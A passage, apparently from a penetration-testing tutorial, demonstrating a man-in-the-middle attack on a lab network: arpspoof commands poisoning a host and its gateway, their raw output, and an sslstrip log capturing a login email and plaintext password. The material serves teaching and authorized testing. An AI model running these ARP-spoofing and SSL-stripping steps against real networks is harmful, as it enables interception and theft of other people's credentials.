Next, I set up arpspoof to get into the flow of traffic by spoofing the default gateway shown in the following screenshot to the host, so that the host will send its traffic to me on the way out:

```
root@kali:~# arpspoof -i eth0 -t 192.168.33.3 192.168.33.1
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae
```

And while I spoof the default gateway, I also spoof the host IP address to the default gateway to send the return traffic to me:

```
root@kali:~# arpspoof -i eth0 -t 192.168.33.1 192.168.33.3
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3 is-at 0:c:29:f8:7b:ae
```

Now that sslstrip is all set, I just need to intercept some traffic and start gleaning information. Based on some other previous intelligence, I will be intercepting traffic from 192.168.33.xxx. I will set up my ARP spoofing like I did in the previous section and get my box in line between that end user and the Internet. Once in line, I can tail the log file to see if I get any good information in it:

```
root@pi-kali:~# more sslstrip.log
2017-02-10 02:37:33,616 SECURE POST Data (my_screenname.aol.com):
sitedomain=&lang=en&locale=us&authlev=1&siteState=&isSiteStateBase64=false&isSiteStateEncoded=false&mcState=initialized&uitype=std&use_am0=&offerId=&seamless=&regPromoCode=&doSSL=&redirectType=&chk=false&isoDP=&usrId=0uilhcJibopAicla loginId=pentester%40gmail.com
password=CanYouSeeMyPassword rememberMe=off
```